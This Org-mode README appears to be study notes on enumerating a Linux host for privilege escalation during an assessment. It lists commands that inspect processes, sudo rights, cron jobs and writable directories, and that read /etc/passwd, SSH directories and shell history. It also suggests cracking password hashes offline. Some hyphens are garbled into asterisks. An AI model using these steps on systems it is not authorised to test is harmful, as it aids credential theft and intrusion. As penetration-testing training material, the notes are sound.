readme.org
#+TITLE: _Linux Privilege Escalation_
#+AUTHOR: Mattia Cossu
#+Description: The root account on Linux systems provides full administrative level access to the operating system. During an assessment, you may gain a low-privileged shell on a Linux host and need to perform privilege escalation to the root account.

* Enumeration 
Enumeration is the key to privilege escalation. 
When you gain initial shell access to the host, it is important to check several key details.

** *OS Version*
Knowing the distribution (Ubuntu, Debian, FreeBSD, Fedora, SUSE, Red Hat, CentOS, etc.) will give you an idea of the types of tools that may be available. This would also identify the operating system version, for which there may be public exploits available.

** *Kernel Version*
As with the OS version, there may be public exploits that target a vulnerability in a specific kernel version. Kernel exploits can cause system instability or even a complete crash. Be careful running these against any production system, and make sure you fully understand the exploit and possible ramifications before running one.

** *Running Services*
Knowing what services are running on the host is important, especially those running as root. A misconfigured or vulnerable service running as root can be an easy win for privilege escalation. Flaws have been discovered in many common services such as Nagios, Exim, Samba, ProFTPd, etc. Public exploit PoCs exist for many of them, such as CVE**2016**9566, a local privilege escalation flaw in Nagios Core < 4.2.4.
#+BEGIN_SRC bash
ps aux | grep root
#+END_SRC

** *Installed Packages and Versions*
it is important to check for any out**of**date or vulnerable packages that may be easily leveraged for privilege escalation. 

** *Logged in Users*
Knowing which other users are logged into the system and what they are doing can give greater into possible local lateral movement and privilege escalation paths.
#+BEGIN_SRC bash
ps au
#+END_SRC

** *User Home Directories*
User home folders may also contain SSH keys that can be used to access other systems or scripts and configuration files containing credentials.

** Other important location are
#+BEGIN_SRC bash
ls /home # Home Directory Contents
ls -la /home/<user>/ # User's Home Directory Contents
ls -l ~/.ssh # SSH Directory Contents
history # Bash history 
#+END_SRC

** *Sudo Privileges*
However, often *sudoer* entries include *NOPASSWD*, meaning that the user can run the specified command without being prompted for a password. Not all commands, even we can run as root, will lead to privilege escalation.
#+BEGIN_SRC bash
sudo -l

Matching Defaults entries for sysadm on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sysadm may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/tcpdump
#+END_SRC

** *Configuration Files*
Configuration files can hold a wealth of information. It is worth searching through all files that end in extensions such as .conf and .config, for usernames, passwords, and other secrets.

** *Readable Shadow File*
If the shadow file is readable, you will be able to gather password hashes for all users who have a password set. While this does not guarantee further access, these hashes can be subjected to an offline brute**force attack to recover the cleartext password.

** *Password Hashes in /etc/passwd*
Occasionally, you will see password hashes directly in the /etc/passwd file. This file is readable by all users, and as with hashes in the shadow file, these can be subjected to an offline password cracking attack. This configuration, while not common, can sometimes be seen on embedded devices and routers.
#+BEGIN_SRC bash
cat /etc/passwd
#+END_SRC

** *Cron Jobs*
Cron jobs on Linux systems are similar to Windows scheduled tasks. They are often set up to perform maintenance and backup tasks. In conjunction with other misconfigurations such as relative paths or weak permissions, they can leverage to escalate privileges when the scheduled cron job runs.
#+BEGIN_SRC bash
ls -la /etc/cron.daily/
#+END_SRC

** *Unmounted File Systems and Additional Drives*
If you discover and can mount an additional drive or unmounted file system, you may find sensitive files, passwords, or backups that can be leveraged to escalate privileges.
#+BEGIN_SRC bash
  lsblk

  NAME                      MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
  loop0                       7:0    0   55M  1 loop /snap/core18/1705
  loop1                       7:1    0   69M  1 loop /snap/lxd/14804
  loop2                       7:2    0   47M  1 loop /snap/snapd/16292
  loop3                       7:3    0  103M  1 loop /snap/lxd/23339
  loop4                       7:4    0   62M  1 loop /snap/core20/1587
  loop5                       7:5    0 55.6M  1 loop /snap/core18/2538
  sda                         8:0    0   20G  0 disk 
  ├─sda1                      8:1    0    1M  0 part 
  ├─sda2                      8:2    0    1G  0 part /boot
  └─sda3                      8:3    0   19G  0 part 
  └─ubuntu--vg-ubuntu--lv 253:0    0   18G  0 lvm  /
  sr0                        11:0    1  908M  0 rom 
#+END_SRC

** *SETUID and SETGID Permissions*
Binaries are set with these permissions to allow a user to run a command as root, without having to grant root**level access to the user. Many binaries contain functionality that can be exploited to get a root shell.

** *Writeable Directories*
It is important to discover which directories are writeable if you need to download tools to the system. You may discover a writeable directory where a cron job places files, which provides an idea of how often the cron job runs and could be used to elevate privileges if the script that the cron job runs is also writeable.
#+BEGIN_SRC bash
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
#+END_SRC

